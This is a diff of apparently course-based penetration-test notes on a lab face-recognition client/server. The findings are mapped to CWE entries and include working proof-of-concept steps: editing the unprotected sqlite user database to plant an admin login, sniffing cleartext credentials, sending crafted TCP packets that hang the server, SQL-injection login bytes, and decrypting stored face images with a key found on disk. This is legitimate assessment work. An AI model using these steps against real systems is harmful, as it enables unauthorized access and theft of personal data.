@@ -46,118 +46,119 @@ Exploit (named technique)
 
 06/23
 V01) insert a arbitrary id/password to DB
-	Compromise Sequence
-		1. modify tartan_user.db. insert new user with the SHA256 hashed password or replace the user's passwd.
-		2. login success using new or modified user
-
 	Vulnerabilities
 		V01-1. sqlite3 database files(tartan_faces.db, tartan_user.db) have no password. So it can be accessed and modified by an attacker.
 			CWE-916: Use of Password Hash With Insufficient Computational Effort https://cwe.mitre.org/data/definitions/916.html
 			CWE-862: Missing Authorization https://cwe.mitre.org/data/definitions/862.html
 
-	Approach
-		V01-1.
-			From install guide(tartan_install.sh), we found some db files are installed.
-				$ cat tartan_install.sh
-				....
-				install tartan*.db /usr/local/tartan/
-				....
+	Compromise Sequence
+		1. modify tartan_user.db. insert new user with the SHA256 hashed password or replace the user's passwd.
+		2. login success using new or modified user
 
-			So we checked the tartan* db with sqlite3. it doesn't request any password, so we could check the data in the table.
-			It consists of id, account, passwd, privilege columns. But the passwd field would be encrypted or hashed.
-				$ sqlite3 tartan_user.db
-				SQLite version 3.22.0 2018-01-22 18:45:57
-				Enter ".help" for usage hints.
-				sqlite> .table
-				user
+	Analysis
+		1. From install guide(tartan_install.sh), we found some db files are installed.
+			$ cat tartan_install.sh
+			....
+			install tartan*.db /usr/local/tartan/
+			....
 
-				sqlite> .schema user
-				CREATE TABLE user (id INTEGER PRIMARY KEY AUTOINCREMENT , account TEXT, passwd TEXT, privilege INT);
+		2. So we checked the tartan* db with sqlite3. it doesn't request any password, so we could check the data in the table.
+		It consists of id, account, passwd, privilege columns. But the passwd field would be encrypted or hashed.
+			$ sqlite3 tartan_user.db
+			SQLite version 3.22.0 2018-01-22 18:45:57
+			Enter ".help" for usage hints.
+			sqlite> .table
+			user
 
-				sqlite> select * from user;
-				1|admin|e9b6ebe030d910d3b0c253b9bd05dfc365f1e17f61f2b64385898a8247b5b792|0
-				2|lg|078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1|2
+			sqlite> .schema user
+			CREATE TABLE user (id INTEGER PRIMARY KEY AUTOINCREMENT , account TEXT, passwd TEXT, privilege INT);
 
-			To understand the logic related in the user credentials, we checked the source codes. So we found some code snippets related in the user id and the password.
-			So we found that the SHA256 is used for the passwd.
-				< mydb.cpp >
-				gboolean
-				CMydb::initialize_database_account()
-				{
-					...
-					const char *sql = "DROP TABLE IF EXISTS user;"
-									  "CREATE TABLE user (id INTEGER PRIMARY KEY AUTOINCREMENT , account TEXT, passwd TEXT, privilege INT);"
-									  "INSERT INTO user VALUES(1, 'admin', 'e9b6ebe030d910d3b0c253b9bd05dfc365f1e17f61f2b64385898a8247b5b792' ,0);"
-									  "INSERT INTO user VALUES(2, 'lg', '078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1' ,2);";
-					...
-				}
+			sqlite> select * from user;
+			1|admin|e9b6ebe030d910d3b0c253b9bd05dfc365f1e17f61f2b64385898a8247b5b792|0
+			2|lg|078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1|2
 
-				< auth.cpp >
-				int CAuth::login(string id, string passwd)
-				{
-					CMydb db;
-					CCyper cyp;
-					return db.find_user(id, cyp.get_passwd_enc(passwd));
-				}
+		3. To understand the logic related in the user credentials, we checked the source codes. So we found some code snippets related in the user id and the password. So we found that the SHA256 is used for the passwd.
+			< mydb.cpp >
+			gboolean
+			CMydb::initialize_database_account()
+			{
+				...
+				const char *sql = "DROP TABLE IF EXISTS user;"
+								  "CREATE TABLE user (id INTEGER PRIMARY KEY AUTOINCREMENT , account TEXT, passwd TEXT, privilege INT);"
+								  "INSERT INTO user VALUES(1, 'admin', 'e9b6ebe030d910d3b0c253b9bd05dfc365f1e17f61f2b64385898a8247b5b792' ,0);"
+								  "INSERT INTO user VALUES(2, 'lg', '078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1' ,2);";
+				...
+			}
 
-				< cyper.cpp >
-				string
-				CCyper::get_passwd_enc(string pass)
-				{
-					unsigned char digest[SHA256_DIGEST_LENGTH];
+			< auth.cpp >
+			int CAuth::login(string id, string passwd)
+			{
+				CMydb db;
+				CCyper cyp;
+				return db.find_user(id, cyp.get_passwd_enc(passwd));
+			}
 
-					SHA256_CTX ctx;
-					SHA256_Init(&ctx);
-					SHA256_Update(&ctx, pass.c_str(), pass.length());
-					SHA256_Final(digest, &ctx);
+			< cyper.cpp >
+			string
+			CCyper::get_passwd_enc(string pass)
+			{
+				unsigned char digest[SHA256_DIGEST_LENGTH];
 
-					string str=bytes2hex(digest,SHA256_DIGEST_LENGTH );
-					// printf("SHA256 digest: %s\n", str.c_str());
-					return str;
-				}
+				SHA256_CTX ctx;
+				SHA256_Init(&ctx);
+				SHA256_Update(&ctx, pass.c_str(), pass.length());
+				SHA256_Final(digest, &ctx);
 
-			Finally we change the db to what we want. Change the admin paswd to SHA256 hashed value of 'lg' and add new 'user'.
-			So we can login 'admin/lg' and 'user/user' in the client program
-				sqlite> replace into user values (1,'admin','0e6ba33f8bc8f41515b9d77c0e27c07ad66f2ae9b09dd7561729d6cd4d27c292',0);
-				sqlite> insert into user values (3,'user','04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb',2);
-				sqlite> select * from user;
-				1|admin|0e6ba33f8bc8f41515b9d77c0e27c07ad66f2ae9b09dd7561729d6cd4d27c292|0
-				2|lg|078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1|2
-				3|user|04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb|2
+				string str=bytes2hex(digest,SHA256_DIGEST_LENGTH );
+				// printf("SHA256 digest: %s\n", str.c_str());
+				return str;
+			}
+
+		4. Finally we change the db to what we want. Change the admin paswd to SHA256 hashed value of 'lg' and add new 'user'.
+		So we can login 'admin/lg' and 'user/user' in the client program
+			sqlite> replace into user values (1,'admin','0e6ba33f8bc8f41515b9d77c0e27c07ad66f2ae9b09dd7561729d6cd4d27c292',0);
+			sqlite> insert into user values (3,'user','04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb',2);
+			sqlite> select * from user;
+			1|admin|0e6ba33f8bc8f41515b9d77c0e27c07ad66f2ae9b09dd7561729d6cd4d27c292|0
+			2|lg|078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1|2
+			3|user|04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb|2
 
 06/24
 V02) sniffing the id/password
+	Vulnerabilities
+		V02-1. the communication channel for the user credentials is not secure
+			CWE-319: Cleartext Transmission of Sensitive Information https://cwe.mitre.org/data/definitions/319.html
+
 	Compromise Sequence
 		1. sniffing the network packet through Wireshark.
 		2. select the 'Non secure' mode and push login button
 		3. the id/password is checked by captured packet
 
-	Vulnerabilities
-		V02-1. the communication channel for the user credentials is not secure
-			CWE-319: Cleartext Transmission of Sensitive Information https://cwe.mitre.org/data/definitions/319.html
+	Analysis
+		1. Capture TCP Packet using port number 50000 (=non-secure port)
+		See wireshark packet in './V02/tcp_packet.pcapng'.
+			No.     Time           Source                Destination           Protocol Length Info
+				  4 0.126187       192.168.0.217         192.168.0.228         TCP      81     11505 → 50000 [PSH, ACK] Seq=1 Ack=1 Win=204800 Len=27
 
-	Approach
-		V02-1.
-			Capture TCP Packet using port number 50000 (=non-secure port)
-			See wireshark packet in './V02/tcp_packet.pcapng'.
-				No.     Time           Source                Destination           Protocol Length Info
-					  4 0.126187       192.168.0.217         192.168.0.228         TCP      81     11505 → 50000 [PSH, ACK] Seq=1 Ack=1 Win=204800 Len=27
+			Frame 4: 81 bytes on wire (648 bits), 81 bytes captured (648 bits) on interface \Device\NPF_{0BA61C95-3362-49D2-9950-76429883512C}, id 0
+			Ethernet II, Src: EFMNetwo_4c:1a:37 (00:26:66:4c:1a:37), Dst: IntelCor_da:66:5a (8c:c6:81:da:66:5a)
+			Internet Protocol Version 4, Src: 192.168.0.217, Dst: 192.168.0.228
+			Transmission Control Protocol, Src Port: 11505, Dst Port: 50000, Seq: 1, Ack: 1, Len: 27
+			Data (27 bytes)
 
-				Frame 4: 81 bytes on wire (648 bits), 81 bytes captured (648 bits) on interface \Device\NPF_{0BA61C95-3362-49D2-9950-76429883512C}, id 0
-				Ethernet II, Src: EFMNetwo_4c:1a:37 (00:26:66:4c:1a:37), Dst: IntelCor_da:66:5a (8c:c6:81:da:66:5a)
-				Internet Protocol Version 4, Src: 192.168.0.217, Dst: 192.168.0.228
-				Transmission Control Protocol, Src Port: 11505, Dst Port: 50000, Seq: 1, Ack: 1, Len: 27
-				Data (27 bytes)
-
-				0000  8c c6 81 da 66 5a 00 26 66 4c 1a 37 08 00 45 00   ....fZ.&fL.7..E.
-				0010  00 43 98 24 40 00 80 06 df 82 c0 a8 00 d9 c0 a8   .C.$@...........
-				0020  00 e4 2c f1 c3 50 02 60 87 7e bd 7a b0 8d 50 18   ..,..P.`.~.z..P.
-				0030  c8 00 75 c5 00 00 53 42 31 54 1b 00 00 00 c7 8c   ..u...SB1T......
-				0040  07 3c e8 03 00 00 0a 05 61 64 6d 69 6e 12 02 6c   .<......admin..l    ## It shows that the user id 'admin' and the password 'lg' are exposed.
-				0050  67                                                g
+			0000  8c c6 81 da 66 5a 00 26 66 4c 1a 37 08 00 45 00   ....fZ.&fL.7..E.
+			0010  00 43 98 24 40 00 80 06 df 82 c0 a8 00 d9 c0 a8   .C.$@...........
+			0020  00 e4 2c f1 c3 50 02 60 87 7e bd 7a b0 8d 50 18   ..,..P.`.~.z..P.
+			0030  c8 00 75 c5 00 00 53 42 31 54 1b 00 00 00 c7 8c   ..u...SB1T......
+			0040  07 3c e8 03 00 00 0a 05 61 64 6d 69 6e 12 02 6c   .<......admin..l    ## It shows that the user id 'admin' and the password 'lg' are exposed.
+			0050  67                                                g
 
 
 V03) exposed user credentials in the server log
+	Vulnerabilities
+		V03-1. the logging information exposes too much information
+			CWE-532: Insertion of Sensitive Information into Log File https://cwe.mitre.org/data/definitions/532.html
+
 	Compromise Sequence
 		1. start server and trace the logs ({git_repo_root}/LgFaceRecDemoTCP_Jetson_NanoV2/log.sh)
 		2. attempt to login
@@ -166,15 +167,15 @@ V03) exposed user credentials in the server log
 			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]:  id:3  account:user, passwd:04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb, privilege:2
 			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]: OK You're a valid user : privilege=2
 
-	Vulnerabilities
-		V03-1. the logging information exposes too much information
-			CWE-532: Insertion of Sensitive Information into Log File https://cwe.mitre.org/data/definitions/532.html
-
-	Approach
-		V03-1. just monitoring the log. we have no idea to find this vulnerability.
+	Analysis
+		1. just monitoring the log. we have no idea to find this vulnerability.
 
 
 V04) infinite loop in the NetworkTCP.cpp
+	Vulnerabilities
+		V04-1. infinite loop in the ReadDataTcp function. because it doesn't handle the return value of 'recv' function correctly. it causes the denial of service.
+			CWE-253: Incorrect Check of Function Return Value https://cwe.mitre.org/data/definitions/253.html
+
 	Compromise Sequence
 		1. execute 'python3 client.py'
 			$ cat ./client.py
@@ -189,48 +190,46 @@ V04) infinite loop in the NetworkTCP.cpp
 				s.connect((HOST, PORT))
 				s.sendall(b'Hello, world')
 
-	Vulnerabilities
-		V04-1. infinite loop in the ReadDataTcp function. because it doesn't handle the return value of 'recv' function correctly. it causes the denial of service.
-			CWE-253: Incorrect Check of Function Return Value https://cwe.mitre.org/data/definitions/253.html
+	Analysis
+		1. when checking the man page of recv, it can return the 0 when a peer is disconnected.
+			$ man recv
+			...
+			RETURN VALUE
+			...
+			When a stream socket peer has performed an orderly shutdown, the return value will be  0  (the
+			traditional "end-of-file" return).
+			...
 
-	Approach
-		V04-1.
-			when checking the man page of recv, it can return the 0 when a peer is disconnected.
-				$ man recv
+		2. But in the source codes, there is no handling of the return 0 of the recv function. So if 'length' param is more than 0 and the recv returns 0 by disconnecting of the peer, the for loop is infinite.
+			< NetworkTCP.cpp >
+			ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length)
+			{
 				...
-				RETURN VALUE
-				...
-				When a stream socket peer has performed an orderly shutdown, the return value will be  0  (the
-				traditional "end-of-file" return).
-				...
-
-			But in the source codes, there is no handling of the return 0 of the recv function.
-			So if 'length' param is more than 0 and the recv returns 0 by disconnecting of the peer, the for loop is infinite.
-				< NetworkTCP.cpp >
-				ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length)
+				for (size_t i = 0; i < length; i += bytes)
 				{
-					...
-					for (size_t i = 0; i < length; i += bytes)
+					if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1)
 					{
-						if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1)
-						{
-							return (-1);
-						}
-						accumulated+=bytes;
-						if (i==0) {
-							...
-						}
-						if (my_packet_size==-1) {
-							...
-						}
-						printf("accumulated packets=%zu   my_packet_size=%zd\n",accumulated, my_packet_size );
-						if (my_packet_size>0 && accumulated>=my_packet_size)
-							return accumulated;
+						return (-1);
 					}
-					return(length);
+					accumulated+=bytes;
+					if (i==0) {
+						...
+					}
+					if (my_packet_size==-1) {
+						...
+					}
+					printf("accumulated packets=%zu   my_packet_size=%zd\n",accumulated, my_packet_size );
+					if (my_packet_size>0 && accumulated>=my_packet_size)
+						return accumulated;
 				}
+				return(length);
+			}
 
 V05) Unintentional handling of the protocol message
+	Vulnerabilities
+		V05-1. The length parameter is set abnormally in case of sending the preamble "SB1T" only
+			CAPEC-494: TCP Fragmentation https://capec.mitre.org/data/definitions/494.html
+
 	Compromise Sequence
 		1. <normal case> execute python statements below. and confirm login success
 			>>> import socket
@@ -249,15 +248,10 @@ V05) Unintentional handling of the protocol message
 			>>> time.sleep(1) # wait
 			>>> s.sendall(b'\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send remain payload to login
 
-	Vulnerabilities
-		V05-1. The length parameter is set abnormally in case of sending the preamble "SB1T" only
-			CAPEC-494: TCP Fragmentation https://capec.mitre.org/data/definitions/494.html
-
-	Approach
-		V05-1.
-			When receiving the 4bytes "SB1T" only and entering "if (i==0)" statement, the "MyPacket *p" is not filled enough.
-			Caller initializes the all memory pointing of data to zero. So in this case, only p->hdr.head is written to the data of the received packet and others are zero.
-			Finally, my_packet_size is changed to 0 and the next receiving data is not parsed correctly. And then keep looping until receiving the size of the value of 'length' input param.
+	Analysis
+		1. When receiving the 4bytes "SB1T" only and entering "if (i==0)" statement, the "MyPacket *p" is not filled enough.
+		Caller initializes the all memory pointing of data to zero. So in this case, only p->hdr.head is written to the data of the received packet and others are zero.
+		2. Finally, my_packet_size is changed to 0 and the next receiving data is not parsed correctly. And then keep looping until receiving the size of the value of 'length' input param.
 
 			< NetworkTCP.cpp >
 			ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length) // all memory pointing of data is zero. length is PACKET_MAX_BUFFER_SIZE (=1024 * 1024)
@@ -306,14 +300,14 @@ V05) Unintentional handling of the protocol message
 
 6/25
 V06) Weak Passwords that Enable Brute Force Attacks
-	Compromise Sequence
-		1. Brute Force Attack of Password
-
 	Vulnerabilities
 		V06-1. Weak Passwords that Enable Brute Force Attacks
 			CWE-521: Weak Password Requirements https://cwe.mitre.org/data/definitions/521.html
 
-	Approach
+	Compromise Sequence
+		1. Brute Force Attack of Password
+
+	Analysis
 		1. Check the source codes of the client related in the password. We found that the password policy is 1~10 Random Alpha/Numeric. There is no minimum password length. When the length of password is less than 6, it has 56,800,235,584 combinations. It takes 1.10 hours or 0.05 days to crack the password. (reference: https://tmedweb.tulane.edu/content_open/bfcalc.php?uc=0&lc=0&nu=0&sc=0&ran=6&rans=0&dict=0)
 			<MFCApplication1Dlg.cpp>
 			BOOL CMFCApplication1Dlg::OnInitDialog()
@@ -347,6 +341,10 @@ V06) Weak Passwords that Enable Brute Force Attacks
 			}
 
 V07) SQL Injection for Login
+	Vulnerabilities
+		V07-1. The server doesn't validate ID/PW from client, so attacker can login with SQL injection.
+			CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') https://cwe.mitre.org/data/definitions/89.html
+
 	Compromise Sequence
 		1. Send SQL injection message to server like below:
 			>>> import socket
@@ -360,11 +358,7 @@ V07) SQL Injection for Login
 			\x02 : password length
 			\x30\x30 : 00
 
-	Vulnerabilities
-		V07-1. The server doesn't validate ID/PW from client, so attacker can login with SQL injection.
-			CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') https://cwe.mitre.org/data/definitions/89.html
-
-	Approach
+	Analysis
 		1. Check the login source codes of the client and server. The client code validates ID/PW input, but the server does not.
 			<mydb.cpp>
 			int CMydb::find_user(string id, string passwd)
@@ -436,15 +430,15 @@ V07) SQL Injection for Login
 
 6/28
 V08) Memory leakeage in the 'get_a_packet' function
-	Compromise Sequence
-		1. Operate run mode
-		2. Check the memory manager of the client system whether or not the occupation is increased.
-
 	Vulnerabilities
 		V08-1. The 'get_a_packet' function doesn't free the structure of the paresed received packet after use it.
 			CWE-401: Missing Release of Memory after Effective Lifetime https://cwe.mitre.org/data/definitions/401.html
 
-	Approach
+	Compromise Sequence
+		1. Operate run mode
+		2. Check the memory manager of the client system whether or not the occupation is increased.
+
+	Analysis
 		1. The occupation of the memory usage of the client program is increased continuously during the operation of system.
 		2. Check the memory leakeage in source codes of the client program. The 'create_protocol_instance' function allocates the new memory. But the 'get_a_packet' function doesn't free the memory after the use. You can check the 'PagedMemorySize64' field of "Get-Process MFCApplication1" command of PowerShell.
 			< Memory Check command in PowerShell> - PagedMemorySize64 (=The amount of memory, in bytes, allocated in the virtual memory paging file for the associated process. https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.pagedmemorysize64?view=net-5.0)
@@ -514,12 +508,6 @@ V08) Memory leakeage in the 'get_a_packet' function
 			}
 
 V09) Extraction of name and face image data used by the face recog. AI engine
-	Compromise Sequence
-		1. Find AES key from file which has name "secret.key"
-		2. Extract data from tartan_face.db
-		3. Decrypt data, Encode data appropriately
-		4. We can find someone's face image (maybe one of Team1's member), and name (test)
-
 	Vulnerabilities
 		V09-1. Storing password in an easy-to-find place and reuse an initial vector make it easy to decrypt Private Persoanl Infomation in database.
 			CWE-922: Insecure Storage of Sensitive Information https://cwe.mitre.org/data/definitions/922.html
@@ -529,7 +517,13 @@ V09) Extraction of name and face image data used by the face recog. AI engine
 			CWE-200: Exposure of Sensitive Information to an Unauthorized Actor https://cwe.mitre.org/data/definitions/200.html
 			CWE-359: Exposure of Private Personal Information to an Unauthorized Actor https://cwe.mitre.org/data/definitions/359.html
 
-	Approach
+	Compromise Sequence
+		1. Find AES key from file which has name "secret.key"
+		2. Extract data from tartan_face.db
+		3. Decrypt data, Encode data appropriately
+		4. We can find someone's face image (maybe one of Team1's member), and name (test)
+
+	Analysis
 		1. Find 16byte data in /var/shinpark/secret.key which is guessed as the KEY used for AES encryption
 			$ hexdump /var/shinpark/secret.key
 			0000000 3412 7856 bc9a f0de 5634 9a78 debc 12f0
@@ -620,10 +614,62 @@ V09) Extraction of name and face image data used by the face recog. AI engine
 
 		5. Open with image Viewer, and we can find someone's face image (maybe one of Team1's member), and name (test)
 
-V10)
-Compromise Sequence
+06/29
+V10) the system cannot be operated on the big endian architectures
+	Vulnerabilities
+		V10-1. the received message cannot be parsed correctly because there is no handling of the endianness of the network packets
+			CWE-198: Use of Incorrect Byte Ordering https://cwe.mitre.org/data/definitions/198.html
 
-Vulnerabilities
-	V09-1.
+	Compromise Sequence
+		1. Use the client program on the big endian architectures
+		2. It may not be working correctly, because the length received from the client is the big endian order.
 
-Approach
+	Analysis
+		1. in the presentation document, there is no mention about the endianness. but the sniffed packet shows that the endian of length field is big endian (see V02).
+		2. send the login packet (compare the packet below to the step 1 of V05) after modifying the length field to the big-endian order.
+			>>> import socket
+			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			>>> s.connect(('192.168.0.228', 50000))
+			>>> s.sendall(b'\x53\x42\x31\x54\x00\x00\x00\x1b\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send login protocol message with id:pass=admin:lg. length is changed \x1b\x00\x00\x00 to \x00\x00\x00\x1b
+		3. login fail. we recognized that the system is not working by the endianness.
+		4. check the code
+		6. at the source codes below, doesn't handle the endianness of the 4bytes length field. So we confrimed the system cannot be executed in the big endian architectures.
+
+			< NetworkTCP.cpp >
+			ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length) // data = buffer, length = 1024*1024
+			{
+				ssize_t bytes;
+				ssize_t my_packet_size=-1;
+				ssize_t accumulated=0;
+
+				for (size_t i = 0; i < length; i += bytes)
+				{
+					if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1)
+					{
+						return (-1);
+					}
+					accumulated+=bytes;
+					if (i==0) {
+						MyPacket *p=(MyPacket*)data; // if data is ["SB1T" + 0x00000001 + ...], it's 1 in big-endian, but it's 16,777,216(=0x01000000) in little-endian
+						printf("max packet length=%zu received=%zu packet_length=%d timestamp=%u msgtype=%d\n",
+									length, bytes, p->hdr.size , p->hdr.timestamp, p->hdr.msgtype);
+						if (p->hdr.head[0]=='S' && p->hdr.head[1]=='B' && p->hdr.head[2]=='1' && p->hdr.head[3]=='T') {
+							my_packet_size=p->hdr.size; // my_packet_size is 16,777,216. So It will do the for loop until the received length reaches 1024*1024. if the peer doesn't send more data, the system is hang in this loop.
+						}
+						// print_pkt_header(data,60);
+					}
+					...
+					printf("accumulated packets=%zu   my_packet_size=%zd\n",accumulated, my_packet_size );
+					if (my_packet_size>0 && accumulated>=my_packet_size)
+						return accumulated;
+				}
+				return(length);
+			}
+
+V11)
+	Compromise Sequence
+
+	Vulnerabilities
+		V11-1.
+
+	Analysis
